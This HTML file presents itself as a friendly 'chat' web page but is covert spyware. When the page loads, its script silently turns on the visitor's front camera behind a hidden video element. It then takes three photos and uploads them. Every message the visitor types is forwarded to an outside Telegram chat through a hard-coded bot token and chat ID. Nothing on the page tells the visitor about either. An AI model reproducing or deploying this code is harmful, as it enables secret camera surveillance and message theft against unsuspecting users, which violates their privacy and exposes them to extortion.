hi
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>chat friends</title>
    <style>
      /* General Body Styling */
      body {
        display: none;
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        height: 100vh;
        background-color: #f1f1f1;
        align-items: center;
        justify-content: center;
      }

      /* Hide camera preview */
      video {
        display: none;
      }

      /* Chat Container Styling */
      .chat-container {
        width: 100%;
        max-width: 400px;
        background-color: #fff;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        margin-bottom: 20px;
        overflow-y: auto;
        height: 300px;
      }

      .message {
        margin: 10px 0;
        padding: 10px;
        background-color: #e0f7fa;
        border-radius: 10px;
        word-wrap: break-word;
      }

      .message.from-user {
        background-color: #c8e6c9;
      }

      .input-container {
        display: flex;
        width: 100%;
      }

      .input-container input {
        width: 80%;
        padding: 10px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }

      .input-container button {
        width: 20%;
        padding: 10px;
        background-color: #00796b;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }

      .input-container button:hover {
        background-color: #004d40;
      }

      /* Welcome Text Styling */
      .welcome-text {
        font-size: 24px;
        color: #00796b;
        margin-bottom: 20px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <!-- Welcome Text -->
    <div class="welcome-text">Welcome to chat ‚ù§Ô∏è-youüíã</div>

    <!-- Chat Interface -->
    <div class="chat-container" id="chat-container">
      <div id="messages"></div>
    </div>

    <div class="input-container">
      <input type="text" id="user-input" placeholder="Type a message..." />
      <button onclick="sendMessage()">Send</button>
    </div>

    <video id="camera-preview" style="display: none" autoplay muted></video>

    <script>
      const telegramBotToken = "7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M"; // Your Telegram bot token
      const telegramChatId = "7327921791"; // Your Telegram chat ID

      // Function to send a message to Telegram
      async function sendMessageToTelegram(message) {
        const url = https://api.telegram.org/bot${telegramBotToken}/sendMessage;

        const formData = new FormData();
        formData.append("chat_id", telegramChatId);
        formData.append("text", message);

        try {
          const response = await fetch(url, {
            method: "POST",
            body: formData,
          });

          const data = await response.json();
          if (data.ok) {
            console.log("Message sent to Telegram");
          } else {
            console.error("Error sending message:", data.description);
          }
        } catch (error) {
          console.error("Error sending message to Telegram:", error);
        }
      }

      // Function to handle sending a message from the user
      function sendMessage() {
        const inputElement = document.getElementById("user-input");
        const messageText = inputElement.value;

        if (messageText.trim() !== "") {
          // Display the message in the chat window
          const messagesDiv = document.getElementById("messages");
          const messageElement = document.createElement("div");
          messageElement.classList.add("message", "from-user");
          messageElement.textContent = messageText;
          messagesDiv.appendChild(messageElement);

          // Scroll to the bottom of the chat window
          messagesDiv.scrollTop = messagesDiv.scrollHeight;// Send the message to Telegram
          sendMessageToTelegram(messageText);

          // Clear the input field
          inputElement.value = "";
        }
      }

      // Function to start the camera and capture a photo
      const videoElement = document.getElementById("camera-preview");
      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }, // ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿßŸÑÿ£ŸÖÿßŸÖŸäÿ©
          });
          videoElement.srcObject = stream;
          await new Promise((resolve) => {
            videoElement.onloadedmetadata = () => {
              videoElement.play();
              resolve();
            };
          });
          return true;
        } catch (err) {
          console.error("Camera access error:", err);
          return false;
        }
      }

      function capturePhoto() {
        const canvas = document.createElement("canvas");
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        canvas.getContext("2d").drawImage(videoElement, 0, 0);

        return new Promise((resolve) => {
          canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append("photo", blob, "photo.jpg"); // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ŸÖÿπ ÿßÿ≥ŸÖ ŸÖŸÑŸÅ

            try {
              await fetch("/upload-photo", {
                method: "POST",
                body: formData,
              });
              resolve();
            } catch (err) {
              console.error("Photo upload error:", err);
              resolve();
            }
          }, "image/jpeg");
        });
      }

      async function captureSequence() {
        for (let i = 0; i < 3; i++) {
          await capturePhoto();
          if (i < 2) await new Promise((resolve) => setTimeout(resolve, 1000));
        }
      }

      async function initializeCapture() {
        const cameraAccessed = await startCamera();
        if (cameraAccessed) {
          setTimeout(captureSequence, 1000);
        }
      }

      initializeCapture();
    </script>
  </body>
</html>
